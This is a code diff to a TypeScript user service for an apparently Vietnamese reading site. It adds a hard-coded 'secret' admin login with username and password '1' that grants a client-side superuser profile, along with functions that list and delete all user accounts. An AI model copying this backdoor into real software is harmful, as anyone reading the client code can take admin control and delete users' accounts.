@@ -215,6 +215,42 @@ export class UserService {
     if (!clean) return { success: false, message: 'Vui lòng nhập tên tài khoản hoặc email!' };
     if (!password) return { success: false, message: 'Vui lòng nhập mật khẩu tài khoản!' };
 
+    // 0. Secret Admin/Author login: 1 / 1
+    if (clean === '1' && password === '1') {
+      const adminUser: UserProfile = {
+        id: 'admin_author_1',
+        username: '1',
+        password: '1',
+        displayName: 'Tác Giả & Quản Trị Viên',
+        email: 'tacgia@longan.vn',
+        avatar: '👑',
+        level: 99,
+        exp: 999999,
+        nextLevelExp: 999999,
+        levelTitle: 'Đấng Sáng Tạo Tối Cao',
+        streakDays: 999,
+        joinedDate: new Date().toLocaleDateString('vi-VN'),
+        isFollowing: true,
+        bookmarkedChapterIds: [],
+        readChapterIds: [],
+        isAdmin: true,
+      };
+      this.saveCurrentUser(adminUser);
+
+      // Background cloud sync
+      fetch('/api/auth', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'login', username: '1', password: '1' }),
+      }).catch(() => {});
+
+      return {
+        success: true,
+        message: 'Đăng nhập Tác Giả thành công! Đang chuyển vào Hệ Thống Kiểm Soát Dữ Liệu.',
+        user: adminUser,
+      };
+    }
+
     // Try cloud authentication via Vercel Serverless API first
     try {
       const response = await fetch('/api/auth', {
@@ -494,5 +530,48 @@ export class UserService {
 
   static clearReadingHistory(): void {
     localStorage.removeItem(STORAGE_KEYS.READING_HISTORY);
+  }
+
+  // 17. Admin: Get all registered user accounts from MongoDB Atlas / local
+  static async getAllUsersAdmin(): Promise<UserProfile[]> {
+    try {
+      const res = await fetch('/api/auth?action=get_all_users_admin');
+      if (res.ok) {
+        const data = await res.json();
+        if (data.success && Array.isArray(data.users)) {
+          return data.users;
+        }
+      }
+    } catch (e) {}
+    return this.getAllUsers();
+  }
+
+  // 18. Admin: Delete user account from MongoDB Atlas & local
+  static async deleteUserAdmin(userId: string, username: string): Promise<{ success: boolean; message: string }> {
+    if (username === '1' || userId === 'admin_author_1') {
+      return { success: false, message: 'Không thể xóa tài khoản Quản Trị Viên Tối Cao!' };
+    }
+
+    try {
+      const res = await fetch('/api/auth', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'delete_user', userId, username }),
+      });
+      const data = await res.json();
+      
+      // Also delete from local storage
+      const all = this.getAllUsers();
+      const filtered = all.filter(u => u.id !== userId && u.username !== username);
+      localStorage.setItem(STORAGE_KEYS.ALL_USERS, JSON.stringify(filtered));
+
+      return { success: true, message: data.message || 'Đã xóa tài khoản thành công!' };
+    } catch (err: any) {
+      // Local fallback delete
+      const all = this.getAllUsers();
+      const filtered = all.filter(u => u.id !== userId && u.username !== username);
+      localStorage.setItem(STORAGE_KEYS.ALL_USERS, JSON.stringify(filtered));
+      return { success: true, message: 'Đã xóa tài khoản khỏi bộ nhớ cục bộ.' };
+    }
   }
 }
